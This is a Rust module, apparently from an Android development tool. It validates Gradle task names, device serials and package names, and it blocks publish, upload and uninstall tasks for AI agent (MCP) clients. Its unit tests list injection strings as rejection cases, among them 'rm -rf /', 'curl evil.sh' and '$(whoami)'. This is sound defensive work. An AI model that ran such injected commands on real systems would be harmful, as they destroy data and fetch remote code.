//! Single source of truth for user-supplied identifier validation.
//!
//! These values reach `adb` and `gradlew` as process arguments. The host
//! never runs them through a shell, but anything sent through `adb shell` IS
//! re-parsed by the device's shell; `utils::device_shell` quotes those
//! arguments. These allowlists are defence in depth on top of that quoting.
//!
//! Both front doors (the Tauri command layer and the MCP server) previously
//! carried their own copies, which had already drifted: the command versions
//! capped lengths and the MCP versions did not. Each caller maps the returned
//! `String` into its own error type.

/// Max length of a Gradle task name.
const MAX_GRADLE_TASK_LEN: usize = 256;

/// Max length of an ADB device serial.
const MAX_DEVICE_SERIAL_LEN: usize = 64;

/// Max length of an activity class name.
const MAX_ACTIVITY_NAME_LEN: usize = 256;

/// Validate a Gradle task name.
///
/// Allowed: alphanumeric, `:`, `-`, `_`, `.`. A leading `-` is rejected: the
/// value is passed to `gradlew` as an argument, where it would be read as a
/// command-line option (`--offline`, `-I init.gradle`, `--stop`, ...).
pub fn validate_gradle_task(task: &str) -> Result<(), String> {
    if task.is_empty() {
        return Err("Gradle task name must not be empty".to_string());
    }
    if task.starts_with('-') {
        return Err(format!(
            "Invalid Gradle task name '{task}': Gradle options are not accepted, only task names"
        ));
    }
    if task.len() > MAX_GRADLE_TASK_LEN {
        return Err(format!(
            "Gradle task name is too long (max {MAX_GRADLE_TASK_LEN} characters)"
        ));
    }
    if !task
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, ':' | '-' | '_' | '.'))
    {
        return Err(format!(
            "Invalid Gradle task name '{task}': only alphanumeric, ':', '-', '_', '.' are allowed"
        ));
    }
    Ok(())
}

/// Validate an ADB device serial.
///
/// Allowed: alphanumeric, `:`, `.`, `-`, `_`.
pub fn validate_device_serial(serial: &str) -> Result<(), String> {
    if serial.is_empty() {
        return Err("Device serial must not be empty".to_string());
    }
    if serial.len() > MAX_DEVICE_SERIAL_LEN {
        return Err(format!(
            "Device serial is too long (max {MAX_DEVICE_SERIAL_LEN} characters)"
        ));
    }
    if !serial
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, ':' | '.' | '-' | '_'))
    {
        return Err(format!(
            "Invalid device serial '{serial}': only alphanumeric, ':', '.', '-', '_' are allowed"
        ));
    }
    Ok(())
}

/// Validate an Android package name.
///
/// Allowed: alphanumeric, `.`, `_`. Must contain at least one `.`.
pub fn validate_package_name(package: &str) -> Result<(), String> {
    if package.is_empty() {
        return Err("Package name cannot be empty".to_string());
    }
    let valid = package
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '.' | '_'));
    if !valid || !package.contains('.') {
        return Err(format!(
            "Invalid package name '{package}'. Expected format: com.example.app"
        ));
    }
    Ok(())
}

/// Validate an activity class name as passed to `am start -n <package>/<activity>`.
///
/// Allowed: alphanumeric, `.`, `_`, `$` (inner classes).
pub fn validate_activity_name(activity: &str) -> Result<(), String> {
    if activity.is_empty() {
        return Err("Activity name cannot be empty".to_string());
    }
    if activity.len() > MAX_ACTIVITY_NAME_LEN {
        return Err(format!(
            "Activity name is too long (max {MAX_ACTIVITY_NAME_LEN} characters)"
        ));
    }
    let valid = activity
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '.' | '_' | '$'));
    if !valid {
        return Err(format!(
            "Invalid activity name '{activity}': only alphanumeric, '.', '_', '$' are allowed"
        ));
    }
    Ok(())
}

/// Task-name patterns MCP clients may not run unless the user enables
/// unrestricted Gradle tasks in the app. Each pattern is a sequence of
/// camelCase words; `Prefix` patterns match at the start of the task name,
/// `Contains` patterns anywhere. These tasks publish, upload, or remove things
/// outside this machine and cannot be undone.
enum DeniedTask {
    Prefix(&'static [&'static str], &'static str),
    Contains(&'static [&'static str], &'static str),
}

const AGENT_DENIED_TASKS: &[DeniedTask] = &[
    DeniedTask::Prefix(&["publish"], "publish*"),
    DeniedTask::Prefix(&["upload"], "upload*"),
    DeniedTask::Prefix(&["uninstall"], "uninstall*"),
    DeniedTask::Prefix(&["close", "and", "release"], "closeAndRelease*"),
    DeniedTask::Contains(&["to", "maven", "central"], "*ToMavenCentral"),
    DeniedTask::Contains(&["play", "store"], "*PlayStore*"),
];

/// Split a task name into lowercase words at camelCase humps, `-`, and `_`,
/// the same boundaries Gradle uses to expand abbreviations.
fn task_words(name: &str) -> Vec<String> {
    let mut words: Vec<String> = Vec::new();
    let mut current = String::new();
    for c in name.chars() {
        if c == '-' || c == '_' {
            if !current.is_empty() {
                words.push(std::mem::take(&mut current));
            }
            continue;
        }
        if c.is_uppercase() && !current.is_empty() {
            words.push(std::mem::take(&mut current));
        }
        current.extend(c.to_lowercase());
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

/// Gradle runs a task from any unambiguous abbreviation of its camelCase
/// words (`pRB` runs `publishReleaseBundle`). A typed word therefore matches
/// a pattern word when either is a prefix of the other.
fn word_matches(typed: &str, pattern: &str) -> bool {
    pattern.starts_with(typed) || typed.starts_with(pattern)
}

fn words_match(typed: &[String], pattern: &[&str]) -> bool {
    typed
        .iter()
        .zip(pattern.iter())
        .all(|(t, p)| word_matches(t, p))
}

/// Reject Gradle tasks that MCP clients may not run by default.
///
/// Matching is abbreviation-aware and case-insensitive, and applies to the
/// task name after any `:project:` path. Call [`validate_gradle_task`] first.
pub fn check_agent_gradle_task(task: &str) -> Result<(), String> {
    let name = task.rsplit(':').next().unwrap_or(task);
    let typed = task_words(name);
    if typed.is_empty() {
        return Ok(());
    }
    for denied in AGENT_DENIED_TASKS {
        let (hit, label) = match denied {
            DeniedTask::Prefix(words, label) => (words_match(&typed, words), label),
            DeniedTask::Contains(words, label) => (
                typed
                    .windows(words.len())
                    .any(|window| words_match(window, words)),
                label,
            ),
        };
        if hit {
            return Err(format!(
                "Gradle task '{task}' is blocked for MCP clients because it matches '{label}', \
                 which publishes, uploads, or uninstalls outside this machine. Run it yourself \
                 from a terminal, or enable \"Allow unrestricted Gradle tasks\" in Keynobi \
                 Settings → MCP."
            ));
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Gradle task ──────────────────────────────────────────────────────────

    #[test]
    fn gradle_task_accepts_valid() {
        for task in [
            "assembleDebug",
            "app:assembleRelease",
            "clean",
            "test_unit",
            "lib-core:build",
            "check.all",
        ] {
            assert!(validate_gradle_task(task).is_ok(), "should accept {task}");
        }
    }

    #[test]
    fn gradle_task_rejects_shell_injection() {
        for task in [
            "assembleDebug; rm -rf /",
            "assembleDebug && curl evil.sh",
            "$(whoami)",
            "`id`",
            "a|b",
            "a b",
            "a>out",
        ] {
            assert!(validate_gradle_task(task).is_err(), "should reject {task}");
        }
    }

    #[test]
    fn gradle_task_rejects_options() {
        for task in [
            "--offline",
            "-Iinit.gradle",
            "--stop",
            "-Pfoo",
            "--scan",
            "-q",
        ] {
            assert!(validate_gradle_task(task).is_err(), "should reject {task}");
        }
        assert!(validate_gradle_task("lib-core:build").is_ok());
    }

    #[test]
    fn agent_policy_blocks_publishing_uploading_and_uninstalling() {
        for task in [
            "publish",
            "publishReleaseBundle",
            ":app:publishReleaseBundle",
            "publishToMavenLocal",
            "publishing",
            "PUBLISH",
            "uploadCrashlyticsMappingFileRelease",
            "uninstallAll",
            "uninstallDebug",
            "closeAndReleaseRepository",
            "publishAllPublicationsToMavenCentralRepository",
            "releaseToMavenCentral",
            "deployPlayStore",
            "playStoreUpload",
            // Abbreviations Gradle would expand to a denied task.
            "pRB",
            "pub",
            "uA",
            "un-all",
            "cAR",
        ] {
            assert!(
                check_agent_gradle_task(task).is_err(),
                "should block {task}"
            );
        }
    }

    #[test]
    fn agent_policy_allows_ordinary_tasks() {
        for task in [
            "assembleDebug",
            ":app:assemblePaidRelease",
            "bundleRelease",
            "clean",
            "check",
            "lint",
            "testDebugUnitTest",
            "connectedAndroidTest",
            "installDebug",
            "packageDebug",
            "preBuild",
            "compileDebugKotlin",
            "copyTo",
            "dependencies",
            "tasks",
        ] {
            assert!(check_agent_gradle_task(task).is_ok(), "should allow {task}");
        }
    }

    #[test]
    fn gradle_task_rejects_empty_and_overlong() {
        assert!(validate_gradle_task("").is_err());
        assert!(validate_gradle_task(&"a".repeat(MAX_GRADLE_TASK_LEN + 1)).is_err());
        assert!(validate_gradle_task(&"a".repeat(MAX_GRADLE_TASK_LEN)).is_ok());
    }

    // ── Device serial ────────────────────────────────────────────────────────

    #[test]
    fn device_serial_accepts_valid() {
        for serial in [
            "emulator-5554",
            "192.168.1.10:5555",
            "R58M12ABCDE",
            "device_1",
        ] {
            assert!(
                validate_device_serial(serial).is_ok(),
                "should accept {serial}"
            );
        }
    }

    #[test]
    fn device_serial_rejects_injection() {
        for serial in ["a; rm -rf /", "$(id)", "a b", "a&&b", "a/../b"] {
            assert!(
                validate_device_serial(serial).is_err(),
                "should reject {serial}"
            );
        }
    }

    /// The MCP copy of this validator had no length cap. Consolidating applies
    /// the command layer's stricter limit to both front doors.
    #[test]
    fn device_serial_rejects_empty_and_overlong() {
        assert!(validate_device_serial("").is_err());
        assert!(validate_device_serial(&"a".repeat(MAX_DEVICE_SERIAL_LEN + 1)).is_err());
        assert!(validate_device_serial(&"a".repeat(MAX_DEVICE_SERIAL_LEN)).is_ok());
    }

    // ── Package name ─────────────────────────────────────────────────────────

    #[test]
    fn package_name_accepts_valid() {
        for pkg in ["com.example.app", "com.example.app.debug", "a.b"] {
            assert!(validate_package_name(pkg).is_ok(), "should accept {pkg}");
        }
    }

    #[test]
    fn package_name_rejects_invalid() {
        for pkg in ["", "noDotsHere", "com.example; rm -rf /", "com example"] {
            assert!(validate_package_name(pkg).is_err(), "should reject {pkg}");
        }
    }
}
